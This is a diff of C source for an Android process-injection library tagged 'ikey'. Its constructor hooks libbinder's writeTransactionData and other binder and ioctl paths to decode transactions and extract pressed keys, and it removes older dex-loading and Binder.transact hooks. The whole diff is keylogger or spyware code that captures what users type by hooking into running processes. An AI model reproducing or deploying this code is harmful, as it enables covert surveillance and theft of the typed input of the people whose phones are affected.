@@ -23,38 +23,26 @@
 #include <sys/epoll.h>
 #include <stdlib.h>
 #include <jni.h>
-
+#include <linux/ioctl.h>
 #include "hook.h"
-#include "dexstuff.h"
-#include "dalvik_hook.h"
 #include "base.h"
 
 #undef log
 #define DEBUG
 #ifdef DEBUG
-/*
- * Android log priority values, in ascending priority order.
- */
-typedef enum android_LogPriority
-{
-   ANDROID_LOG_UNKNOWN = 0, ANDROID_LOG_DEFAULT, /* only for SetMinPriority() */
-   ANDROID_LOG_VERBOSE, ANDROID_LOG_DEBUG, ANDROID_LOG_INFO, ANDROID_LOG_WARN, ANDROID_LOG_ERROR, ANDROID_LOG_FATAL, ANDROID_LOG_SILENT, /* only for SetMinPriority(); must be last */
-} android_LogPriority;
-
-//memset(tag,0,256-1);
-char tag[256];
-#define log(...) {\
-tag[0]=tag[1]=0;\
-snprintf(tag,256,"ikey:%s",__FUNCTION__);\
-__android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
+#define LOG_TAG "ikey"
+#include "log.h"
+#define log LOGD
 #define logf(...) {FILE *f = fopen("/data/local/tmp/log", "a+");\
-        if(f!=NULL){\
-        fprintf(f,"%s: ",__FUNCTION__);\
-        fprintf(f, __VA_ARGS__);\
-        fflush(f); fclose(f); }}
-#else
-#define log(...)
+  if(f!=NULL){\
+    fprintf(f,"%s: ",__FUNCTION__);\
+    fprintf(f, __VA_ARGS__);\
+    fflush(f); fclose(f); }}
 #endif
+#include "dexstuff.h"
+#include "dalvik_hook.h"
+#include "ipc_examiner.h"
+
 struct dalvik_cache_t
 {
    // for the call inside the hijack
@@ -62,9 +50,9 @@ struct dalvik_cache_t
    jmethodID mid_h;
 };
 
-static struct hook_t eph;
 static struct dexstuff_t d;
-static struct dalvik_hook_t transact_dh;
+static struct hook_t talkWithDriver_dh;
+static struct hook_t key_dh;
 static struct dalvik_hook_t commitText_dh;
 static struct dalvik_cache_t commitText_cache;
 
@@ -73,7 +61,7 @@ static int debug;
 
 static void my_log(char *msg)
 {
-   log("%s", msg)
+   log("%s", msg);
 }
 static void my_log2(char *msg)
 {
@@ -101,129 +89,6 @@ static void get_android_version()
       pclose(fp);
    }
 }
-char * _fgetln(FILE *stream, size_t *len)
-{
-   static char *buffer = NULL;
-   static size_t buflen = 0;
-   if (stream == NULL) {
-      log("stream null \n");
-      return NULL;
-   }
-   if (buflen == 0) {
-      buflen = 512;
-      if ((buffer = malloc(buflen + 1)) == NULL) {
-         log("fatal: malloc: out of memory");
-         return NULL;
-      }
-   }
-   if (fgets(buffer, buflen + 1, stream) == NULL) {
-      log("no data available");
-      free(buffer);
-      return NULL;
-   }
-   *len = strlen(buffer);
-   while (*len == buflen && buffer[*len - 1] != '\n') {
-      char *tmp_buffer = NULL;
-      if ((tmp_buffer = realloc(buffer, 2 * buflen + 1)) == NULL) {
-         log("fatal: realloc: out of memory");
-         free(buffer);
-         return NULL;
-      }
-      buffer = tmp_buffer;
-      if (fgets(buffer + buflen, buflen + 1, stream) == NULL) {
-         log("no more data available");
-         free(buffer);
-         return NULL;
-      }
-      *len += strlen(buffer + buflen);
-      buflen *= 2;
-   }
-   return buffer;
-}
-ssize_t getline(char **lineptr, size_t *n, FILE *stream)
-{
-   char *ptr;
-   if (stream == NULL) {
-      log("stream null \n");
-      return -1;
-   }
-   ptr = _fgetln(stream, n);
-   if (ptr == NULL) {
-      log("ptr null \n");
-      return -1;
-   }
-   /* Free the original ptr */
-   if (*lineptr != NULL)
-      free(*lineptr);
-   /* Add one more space for '\0' */
-   size_t len = *n + 1;
-   /* Update the length */
-   n[0] = len;
-   /* Allocate a new buffer */
-   *lineptr = malloc(len);
-   if (*lineptr) {
-      log("failed to malloc %d \n", len);
-      return -1;
-   }
-   /* Copy over the string */
-   memcpy(*lineptr, ptr, len - 1);
-   /* Write the NULL character */
-   (*lineptr)[len - 1] = '\0';
-   /* Return the length of the new buffer */
-   log("got %d :%s \n");
-   return len;
-}
-// returned char pointer must be freed by the caller
-static char * get_gobbler_pat(char *path)
-{
-   char *line = NULL;
-   char *command = NULL;
-   int read = 0, len;
-   if (path == NULL || strlen(path) <= 0) {
-      log("invalid path passed\n");
-      return line;
-   }
-   // allocate "ls " and the \0 plus strlen path
-   size_t cmd_len = strlen(path) + 4;
-   if (cmd_len > 512) {
-      log("invalid path too long\n");
-
-   }
-   log("allocating %d long string", cmd_len);
-   command = malloc(cmd_len);
-   if (command == NULL) {
-      log("failed to alloc memory");
-      return line;
-   }
-   memset(command, cmd_len, '\0');
-   snprintf(command, cmd_len, "ls %s", path);
-   log("calling %s", command);
-   FILE *fp = popen(command, "r");
-   if (fp) {
-      while ((read = getline(&line, &len, fp)) != -1) {
-         log("[*] files %s \n", line);
-      }
-      if (line) {
-         if (strstr(line, path) == NULL) {
-            free(line);
-            log("failed to get gobbler\n");
-         } else {
-            log("got file %s\n", line);
-         }
-      }
-   } else {
-      log("failed to call %s\n", command);
-   }
-   if (command) {
-      free(command);
-      command = NULL;
-   }
-   if (fp) {
-      pclose(fp);
-   }
-   return line;
-}
-
 static int load_dext(char * dext_path, char **classes)
 {
 
@@ -236,16 +101,18 @@ static int load_dext(char * dext_path, char **classes)
    }
    if (strstr(dext_path, "*") != NULL) {
       log(" loaddex gobbler passed\n");
+      /*  
       file = get_gobbler_pat(dext_path);
       if (file != NULL) {
          cookie = dexstuff_loaddex(&d, file);
       } else {
          file = dext_path;
       }
+      */
       return 1;
    }
    cookie = dexstuff_loaddex(&d, file);
-   log("loaddex res = %x\n", cookie)
+   log("loaddex res = %x\n", cookie);
    if (!cookie) {
       char *dext_file = file;
       while (strstr(dext_file, "/") != NULL) {
@@ -310,10 +177,10 @@ static int icommitText(JNIEnv *env, jobject this, jobject p)
          if (commitText_cache.mid_h) {
             callOrig = (*env)->CallStaticIntMethod(env, commitText_cache.cls_h, commitText_cache.mid_h, p);
          } else {
-            log("method not found!\n")
+            log("method not found!\n");
          }
       } else {
-         log("phone/android/com/SMSDispatch not found!\n")
+         log("phone/android/com/SMSDispatch not found!\n");
       }
    }
    // call original SMS dispatch method
@@ -332,7 +199,7 @@ static int icommitText(JNIEnv *env, jobject this, jobject p)
          log("got an exception!!");
          (*env)->ExceptionClear(env);
       } else {
-         log("success calling : %s\n", commitText_dh.method_name)
+         log("success calling : %s\n", commitText_dh.method_name);
       }
    } else {
       //log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
@@ -342,89 +209,98 @@ static int icommitText(JNIEnv *env, jobject this, jobject p)
 
    return callOrig;
 }
-static int itransact(JNIEnv *env, jobject this, jint code,jobject data,jobject reply,jint flags)
+
+extern int my_ioctl_arm(int fd, int request, ...);
+extern int my_talk_arm(void *this, char doReceive);
+static pthread_mutex_t cs_mutex =  PTHREAD_RECURSIVE_MUTEX_INITIALIZER;
+int my_talk(void *this,int doReceive)
 {
-   jint callOrig = 1;
-   int doit = 1;
-   (*env)->MonitorEnter(env, this);
-   char *classes[] = { "com/android/inputmethod/Iprocess", "phone/android/com/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
-   //if (processUnsolicited_cache.cls_h == 0) {
-   if (load_dext("/data/local/tmp/keyclass.dex", classes)) {
-      log("failed to load class ");
-      doit = 0;
-   }
-   //} else {
-   //   log("using cache");
-   //}
-
-   if (doit) {
-      // call static method and passin the sms
-      //log(" parcel = 0x%x\n", p)
-      //if (processUnsolicited_cache.cls_h == 0) {
-      commitText_cache.cls_h = (*env)->FindClass(env, "com/android/inputmethod/Iprocess");
-      //}
-      if (commitText_cache.cls_h != 0) {
-         //if (processUnsolicited_cache.mid_h == 0) {
-         commitText_cache.mid_h = (*env)->GetStaticMethodID(env, commitText_cache.cls_h, "transact", "(ILandroid/os/Parcel;Landroid/os/Parcel;I)Z");
-         //}
-         if (commitText_cache.mid_h) {
-
-            jvalue args[4];
-            /*
-             typedef union jvalue {
-             jboolean z;
-             jbyte    b;
-             jchar    c;
-             jshort   s;
-             jint     i;
-             jlong    j;
-             jfloat   f;
-             jdouble  d;
-             jobject  l;
-             } jvalue;
-             */
-            args[0].i = code;
-            args[1].l = data;
-            args[2].l = reply;
-            args[3].i = flags;
-            callOrig = (*env)->CallStaticBooleanMethodA(env, commitText_cache.cls_h, commitText_cache.mid_h, args);
-         } else {
-            log("method not found!\n")
-         }
-      } else {
-         log("com/android/inputmethod/Iprocess not found!\n")
-      }
-   }
-   // call original SMS dispatch method
-   if ((*env)->ExceptionOccurred(env)) {
-      log("got an exception!!");
-      (*env)->ExceptionDescribe(env);
-      (*env)->ExceptionClear(env);
-   }
-   (*env)->MonitorExit(env, this);
-   dalvik_prepare(&d, &transact_dh, env);
-
-   if (callOrig) {
-      jvalue args[4];
-      args[0].i = code;
-      args[1].l = data;
-      args[2].l = reply;
-      args[3].i = flags;
-      (*env)->CallBooleanMethodA(env, this, transact_dh.mid, args);
-      if ((*env)->ExceptionOccurred(env)) {
-         log("got an exception!!");
-         (*env)->ExceptionClear(env);
-      } else {
-         log("success calling : %s\n", transact_dh.method_name)
-      }
-   } else {
-      //log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
-      callOrig = 1;
-   }
-   dalvik_postcall(&d, &transact_dh);
-
-   return callOrig;
+  int (*orig_talk)(void *,int) = (void*) talkWithDriver_dh.orig;
+  /* Enter the critical section -- other threads are locked out */
+  //pthread_mutex_lock( &cs_mutex );
+  hook_precall(&talkWithDriver_dh);
+  struct binder_write_read* bwr_p = calloc(1,sizeof(struct binder_write_read));
+  if(bwr_p!=NULL){
+    log("my_talk thumb> doReceive %d\n", doReceive);
+    log("talk calling orig");
+    bwr_p = get_binder_wr(this,doReceive, bwr_p);
+    if(decode_binder_wr((struct binder_write_read *)bwr_p,"before")){
+      get_btd_verbose((struct binder_write_read *)bwr_p,1,"before");
+    }
+  }
+  int res = orig_talk(this,doReceive);
+  if(bwr_p!=NULL){
+  //  if(decode_binder_wr((struct binder_write_read *)bwr_p,"after")){
+  //    get_btd_verbose((struct binder_write_read *)bwr_p,0,"after");
+   // }
+    free(bwr_p);
+  }
+  hook_postcall(&talkWithDriver_dh);
+  //pthread_mutex_unlock( &cs_mutex );
+  return res;
 }
+int my_ioctl_hook_full(int fd, int request, void *data){
+#if 0 //use hooked fnc
+  int (*orig)(int fd, int request, ...);
+  orig = (void*)key_dh.orig;
+  //log("orig ioctl calling\n");
+  hook_precall(&key_dh);
+  int res = orig(fd, request,data);
+  hook_postcall(&key_dh);
+  log("orig ioctl called\n");
+#else //use imported __ioctl
+  int res = __ioctl(fd, request,data);
+  return res;
+#endif
+}
+extern my_ioctl_hook_arm(int fd, int request, ...);
+int (*orig)(int fd, int request, ...)= NULL;
+int my_ioctl_hook(int fd, int request, ...)
+{
+  va_list ap;
+  void * data;
+  //log("my_ioctl_hook\n");
+  va_start(ap, request);
+  
+  data = va_arg(ap, void *);
+#if 1 //use hooked fnc
+  if( orig == NULL ){
+    orig = (void*)key_dh.orig;
+  }
+  //log("orig ioctl calling\n");
+  if(request == BINDER_WRITE_READ && decode_binder_wr((struct binder_write_read *)data,"before")){
+   //log("bwr->write_size = %x[outAvail] bwr->write_buffer=0x%x",
+     //  ((struct binder_write_read *)data)->write_size,
+     //  ((struct binder_write_read *)data)->write_buffer);
+    get_btd((struct binder_write_read *)data,1,"before");
+  }
+  hook_precall(&key_dh);
+  int res = orig(fd, request,data);
+  hook_postcall(&key_dh);
+#else //use imported __ioctl
+  if(request == BINDER_WRITE_READ && decode_binder_wr((struct binder_write_read *)data,"before")){
+   //log("bwr->write_size = %x[outAvail] bwr->write_buffer=0x%x",
+     //  ((struct binder_write_read *)data)->write_size,
+     //  ((struct binder_write_read *)data)->write_buffer);
+    get_btd((struct binder_write_read *)data,1,"before");
+  }
+ 
+   int res = __ioctl(fd, request,data);
+   
+  /* if(request == BINDER_WRITE_READ && decode_binder_wr((struct binder_write_read *)data,"after")){
+     get_btd((struct binder_write_read *)data,0,"after");
+   }
+   */
+#endif
+  //hook_postcall(&key_dh);
+  va_end(ap);
+  return res;
+}
+
+
+// set my_init as the entry point
+void __attribute__ ((constructor)) my_init(void);
+/*  
 static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
 {
    int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
@@ -435,38 +311,44 @@ static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, in
    // resolve symbols from DVM
    dexstuff_resolv_dvm(&d);
    log("my_epoll_wait: try_hook\n")
-   /* Android < 4.4.x*/
-   if (and_maj == 4 && and_min < 4) {
-      commitText_cache.cls_h = NULL;
-      commitText_cache.mid_h = NULL;
-      //public final boolean transact(int code, Parcel data, Parcel reply,int flags);
-      dalvik_hook_setup(&transact_dh, "Landroid/os/Binder;", "transact", "(ILandroid/os/Parcel;Landroid/os/Parcel;I)Z", 5, itransact);
-      if (dalvik_hook(&d, &transact_dh)) {
-         log("my_epoll_wait: hook transact ok\n")
-      } else {
-         log("my_epoll_wait: hook transact fails\n")
-      }
-   } else if (and_maj == 4 && and_min >= 4) {
-
-      //private void processUnsolicited (Parcel p) {
-      commitText_cache.cls_h = NULL;
-      commitText_cache.mid_h = NULL;
-      dalvik_hook_setup(&commitText_dh, "Lcom/android/internal/telephony/RIL;", "commitText", "(Landroid/os/Parcel;)V", 3, icommitText);
-      if (dalvik_hook(&d, &commitText_dh)) {
-         log("my_epoll_wait: hook processUnsolicited ok\n")
-      } else {
+     if (and_maj == 4 && and_min >= 4) {
+       //private void processUnsolicited (Parcel p) {
+       processUnsolicited_cache.cls_h = NULL;
+       processUnsolicited_cache.mid_h = NULL;
+       dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
+       if (dalvik_hook(&d, &processUnsolicited_dh)) {
+         log("my_epoll_wait: hook  ok\n")
+       } else {
          log("my_epoll_wait: hook processUnsolicited fails\n")
-      }
-   } else {
+       }
+
+     } else {
       log("injection not possible \n");
       return 1;
    }
    int res = orig_epoll_wait(epfd, events, maxevents, timeout);
    return res;
 }
+*/
+extern status_t my_writeTransact_arm(void *this,int32_t cmd, uint32_t binderFlags,int32_t handle, uint32_t code, void* parcel, status_t* statusBuffer);
+static struct hook_t writeTransact_dh;
 
-// set my_init as the entry point
-void __attribute__ ((constructor)) my_init(void);
+status_t my_writeTransact(void *this,int32_t cmd, uint32_t binderFlags,int32_t handle, uint32_t code, void* parcel, status_t* statusBuffer){
+  
+  status_t (*orig_transact)(void *this,int32_t cmd, uint32_t binderFlags,int32_t handle, uint32_t code, void* parcel, status_t* statusBuffer)=(void*) writeTransact_dh.orig;
+  hook_precall(&writeTransact_dh);
+  //log("calling orig writeTransactionData cmd %s",get_tc(cmd));
+  if(cmd == BC_TRANSACTION && parcel!=NULL){
+    unsigned int parcel_p = *(unsigned long*)(parcel + mData);
+    char *interface = (char*)get_intf_desc_parcel((unsigned int*)parcel_p,cmd);
+    log("%s  write: desc=%s",__FUNCTION__,interface);
+    extract_key_pressed(interface,parcel_p,code);
+  }
+  status_t res = orig_transact(this,cmd,binderFlags,handle,code,parcel,statusBuffer);
+  //log("calling orig called");
+  hook_postcall(&writeTransact_dh);
+  return res;
+}
 
 void my_init(void)
 {
@@ -476,8 +358,10 @@ void my_init(void)
    // set log function for  libbase (very important!)
    set_logfunction(my_log2);
    // set log function for libdalvikhook (very important!)
-   dalvikhook_set_logfunction(my_log2);
-   hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0);
-   dexstuff_resolv_dvm(&d);
+   //dalvikhook_set_logfunction(my_log2);
+   //hook(&key_dh, getpid(), "libc.", "ioctl", my_ioctl_hook_arm, my_ioctl_hook);
+   //hook(&talkWithDriver_dh, getpid(), "libbinder", "_ZN7android14IPCThreadState14talkWithDriverEb", my_talk_arm, my_talk);
+   hook(&writeTransact_dh, getpid(), "libbinder", "_ZN7android14IPCThreadState20writeTransactionDataEijijRKNS_6ParcelEPi", my_writeTransact_arm, my_writeTransact);
+   //dexstuff_resolv_dvm(&d);
    //dalvik_dump_class(&d,"");
 }
